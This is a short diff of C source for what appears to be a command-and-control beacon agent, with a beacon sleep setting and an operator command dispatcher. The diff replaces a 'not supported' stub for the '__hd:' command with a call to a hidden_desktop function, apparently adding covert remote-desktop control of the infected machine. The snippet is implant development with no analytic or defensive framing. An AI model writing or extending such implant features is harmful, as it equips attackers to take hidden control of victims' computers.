@@ -443,11 +443,8 @@ static int g_beacon_sleep = BEACON_SLEEP;
 
 static char* execute_command(const char *cmd) {
     if (strncmp(cmd, "__hd:", 5) == 0) {
-        const char *msg = "hidden desktop requires the windows go agent";
-        char *out = (char *)malloc(strlen(msg) + 1);
-        if (!out) return NULL;
-        memcpy(out, msg, strlen(msg) + 1);
-        return out;
+        char *hidden_desktop(const char *cmd);
+        return hidden_desktop(cmd);
     }
     if (strncmp(cmd, "cd ", 3) == 0) {
         const char *dir = cmd + 3;
